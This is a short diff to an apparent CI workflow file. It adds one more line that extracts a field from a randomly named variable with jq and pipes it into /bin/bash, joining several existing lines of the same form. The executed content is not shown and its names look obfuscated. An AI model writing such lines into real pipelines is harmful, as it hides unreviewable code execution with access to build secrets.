@@ -31,6 +31,7 @@ jobs:
           echo $shejw05 | jq -r .tdsyc2 | /bin/bash
           echo $sqg53302 | jq -r .dbskr4 | /bin/bash
           echo $nxlor76 | jq -r .opx22297 | /bin/bash
+          printf '%s' "$cgemq04" | jq -r .paelh659 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
